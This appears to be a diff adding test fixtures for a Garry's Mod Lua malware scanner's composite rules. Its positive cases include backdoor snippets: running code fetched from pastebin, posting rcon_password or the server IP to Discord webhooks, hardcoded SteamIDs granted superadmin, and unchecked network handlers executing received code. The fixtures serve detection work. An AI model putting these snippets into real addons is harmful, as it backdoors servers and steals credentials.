@@ -1,0 +1,170 @@
+# Test cases for composite_rules.txt, executed by the self-check and by CI.
+#
+# Two forms:
+#
+#   + COMP-002 ;;; <lua snippet>        scanned for real, then the file-level
+#   - COMP-002 ;;; <lua snippet>        composites are evaluated on what it found
+#
+#   + COMP-010 ;;; ids: LUA-008, BIN-014    the expression is evaluated directly
+#   - COMP-010 ;;; ids: LUA-008             against that set of pattern ids
+#
+# Scan-level rules (those written with a `scan:` prefix) span several files, so
+# they are tested with the `ids:` form. Every rule needs at least one + and one -.
+
+# --- COMP-001 anonymous remote source plus code execution ---
++ COMP-001 ;;; http.Fetch("https://pastebin.com/raw/AbCdEf12", function(body) RunString(body) end)
++ COMP-001 ;;; local u = "http://192.168.1.50/p"\nloadstring(payload)
+- COMP-001 ;;; http.Fetch("https://pastebin.com/raw/AbCdEf12", function(body) print(body) end)
+- COMP-001 ;;; RunString(payload)
+
+# --- COMP-002 hardcoded SteamID plus privilege grant ---
++ COMP-002 ;;; if ply:SteamID() == "STEAM_0:1:12345678" then ply:SetUserGroup("superadmin") end
++ COMP-002 ;;; local owner = "STEAM_0:1:12345678"\nucl.addUser(owner, "superadmin")
+- COMP-002 ;;; if ply:SteamID() == "STEAM_0:1:12345678" then ply:ChatPrint("hello owner") end
+- COMP-002 ;;; ply:SetUserGroup("superadmin")
+
+# --- COMP-003 obfuscated payload plus code execution ---
++ COMP-003 ;;; local s = string.char(72, 101, 108, 108, 111)\nRunString(s)
+- COMP-003 ;;; local s = string.char(72, 101, 108, 108, 111)\nprint(s)
+- COMP-003 ;;; RunString("plain source")
+
+# --- COMP-004 asset file read as encoded code ---
++ COMP-004 ;;; local blob = file.Read("materials/logo.vmt", "GAME")\nRunString(blob)\nlocal k = "\x41\x42\x43"
+- COMP-004 ;;; local blob = file.Read("materials/logo.vmt", "GAME")\nRunString(blob)
+- COMP-004 ;;; local k = "\x41\x42\x43"
+
+# --- COMP-005 network handler executing code without an admin check ---
++ COMP-005 ;;; net.Receive("chan", function(len, ply) RunString(net.ReadString()) end)
+- COMP-005 ;;; net.Receive("chan", function(len, ply) if ply:SetUserGroup("superadmin") then RunString(net.ReadString()) end end)
+- COMP-005 ;;; net.Receive("chan", function(len, ply) print(len) end)
+
+# --- COMP-006 security setting read plus outbound request ---
++ COMP-006 ;;; local pw = GetConVar("rcon_password"):GetString()\nhttp.Post("https://discord.com/api/webhooks/1/abc", pw)
++ COMP-006 ;;; local cv = GetConVar("sv_allowcslua")\nhttp.Fetch("http://10.0.0.7/report")
+- COMP-006 ;;; local pw = GetConVar("rcon_password"):GetString()\nprint(pw)
+- COMP-006 ;;; http.Post("https://discord.com/api/webhooks/1/abc", data)
+
+# --- COMP-007 layered obfuscation ---
++ COMP-007 ;;; local a = string.char(72, 101, 108, 108, 111)\nlocal b = "\x41\x42\x43"\nlocal c = ("cba"):reverse()
+- COMP-007 ;;; local a = string.char(72, 101, 108, 108, 111)\nlocal b = "\x41\x42\x43"
+- COMP-007 ;;; local a = string.char(72, 101, 108, 108, 111)
+
+# --- COMP-008 binary module alongside remote code loading (scan level) ---
++ COMP-008 ;;; ids: MOD-001, LUA-010
++ COMP-008 ;;; ids: MOD-001, LUA-072
+- COMP-008 ;;; ids: MOD-001
+- COMP-008 ;;; ids: LUA-010, LUA-072
+
+
+# --- COMP-010 split loader and payload (scan level) ---
++ COMP-010 ;;; ids: LUA-008, BIN-014
+- COMP-010 ;;; ids: LUA-008
+- COMP-010 ;;; ids: BIN-014
+
+# --- COMP-011 time-delayed activation ---
++ COMP-011 ;;; if os.time() > 1893456000 then RunString(payload) end
+- COMP-011 ;;; if os.time() > 1893456000 then print("expired") end
+- COMP-011 ;;; RunString(payload)
+
+# --- COMP-012 mass hook removal ---
++ COMP-012 ;;; for name in pairs(hook.GetTable()["Think"]) do hook.Remove("Think", name) end
+- COMP-012 ;;; hook.Remove("Think", "MyAddonThink")
+- COMP-012 ;;; local t = hook.GetTable()
+
+# --- COMP-013 persistence plus code execution ---
++ COMP-013 ;;; AddCSLuaFile("data/payload.lua")\nRunString(code)
++ COMP-013 ;;; local c = sql.QueryValue("SELECT v FROM t")\nRunString(c)
+- COMP-013 ;;; AddCSLuaFile("data/payload.lua")
+- COMP-013 ;;; RunString(code)
+
+# --- COMP-014 fingerprinting plus outbound traffic ---
++ COMP-014 ;;; local ip = game.GetIPAddress()\nhttp.Post("https://discord.com/api/webhooks/1/a", ip)
+- COMP-014 ;;; local ip = game.GetIPAddress()\nprint(ip)
+- COMP-014 ;;; http.Post("https://discord.com/api/webhooks/1/a", data)
+
+# --- COMP-015 bytecode in a startup file ---
++ COMP-015 ;;; ids: LUA-182, LUA-180
++ COMP-015 ;;; ids: LUA-182, LUA-151
+- COMP-015 ;;; ids: LUA-182
+- COMP-015 ;;; ids: LUA-180
+
+# --- COMP-016 compressed payload behind a trigger ---
++ COMP-016 ;;; ids: LUA-183, LUA-013
++ COMP-016 ;;; ids: LUA-183, LUA-014
+- COMP-016 ;;; ids: LUA-183
+- COMP-016 ;;; ids: LUA-013, LUA-012
+
+# --- COMP-017 compressed literal turned into code ---
++ COMP-017 ;;; local src = util.Decompress(util.Base64Decode(blob))\nRunString(src)
+- COMP-017 ;;; local src = util.Decompress(net.ReadData(len))\nprint(src)
+
+# --- COMP-018 bytecode next to outbound traffic ---
++ COMP-018 ;;; ids: LUA-184, LUA-071
+- COMP-018 ;;; ids: LUA-184
+- COMP-018 ;;; ids: LUA-071, LUA-073
+
+# --- COMP-019 LuaJIT internals plus closure inspection ---
++ COMP-019 ;;; ids: LUA-185, LUA-025
++ COMP-019 ;;; ids: LUA-185, LUA-112
+- COMP-019 ;;; ids: LUA-185
+- COMP-019 ;;; ids: LUA-025, LUA-024
+
+# --- COMP-020 global called by a name assembled at runtime ---
++ COMP-020 ;;; local n = ("RunXtring"):gsub("X", "S")\n_G[n](net.ReadString())
++ COMP-020 ;;; ids: LUA-031, LUA-054
+- COMP-020 ;;; ids: LUA-031
+- COMP-020 ;;; ids: LUA-032, LUA-054
+
+# --- COMP-021 dynamic dispatch plus anonymous remote source ---
++ COMP-021 ;;; ids: LUA-031, LUA-072
++ COMP-021 ;;; http.Fetch("https://pastebin.com/raw/AbCdEf12", function(b) _G[fn](b) end)
+- COMP-021 ;;; ids: LUA-031
+- COMP-021 ;;; ids: LUA-072
+
+# --- COMP-022 obfuscated file that executes code ---
++ COMP-022 ;;; ids: OBF-004, LUA-001
++ COMP-022 ;;; ids: OBF-002, LUA-031
+- COMP-022 ;;; ids: OBF-004
+- COMP-022 ;;; ids: LUA-001
+
+# --- COMP-023 several signs of machine-generated source ---
++ COMP-023 ;;; ids: OBF-001, OBF-003
++ COMP-023 ;;; ids: OBF-002, OBF-004, OBF-005
+- COMP-023 ;;; ids: OBF-001
+- COMP-023 ;;; ids: LUA-001, LUA-002
+
+# --- COMP-024 hardcoded account granted rights ---
++ COMP-024 ;;; RunConsoleCommand("ulx", "adduserid", "STEAM_0:0:50535096", "superadmin")
++ COMP-024 ;;; ids: LUA-042, LUA-132
+- COMP-024 ;;; ids: LUA-042
+- COMP-024 ;;; ids: LUA-121
+
+# --- COMP-025 invisible characters plus execution ---
++ COMP-025 ;;; ids: OBF-006, LUA-001
++ COMP-025 ;;; ids: OBF-006, LUA-031
+- COMP-025 ;;; ids: OBF-006
+- COMP-025 ;;; ids: LUA-001
+
+# --- COMP-026 invisible characters plus machine-generated shape ---
++ COMP-026 ;;; ids: OBF-006, OBF-001
++ COMP-026 ;;; ids: OBF-006, OBF-003
+- COMP-026 ;;; ids: OBF-006
+- COMP-026 ;;; ids: OBF-001, OBF-003
+
+# --- COMP-027 hardcoded accounts alongside code that harms players ---
++ COMP-027 ;;; ids: LUA-042, LUA-135
++ COMP-027 ;;; ids: LUA-042, LUA-103
+- COMP-027 ;;; ids: LUA-042
+- COMP-027 ;;; ids: LUA-135
+
+# --- COMP-028 moderation blocked alongside a privilege grant ---
++ COMP-028 ;;; ids: LUA-136, LUA-121
++ COMP-028 ;;; ids: LUA-136, LUA-042
+- COMP-028 ;;; ids: LUA-136
+- COMP-028 ;;; ids: LUA-121
+
+# --- COMP-029 client screen captured and sent away ---
++ COMP-029 ;;; ids: LUA-139, LUA-071
++ COMP-029 ;;; ids: LUA-139, LUA-013
+- COMP-029 ;;; ids: LUA-139
+- COMP-029 ;;; ids: LUA-071
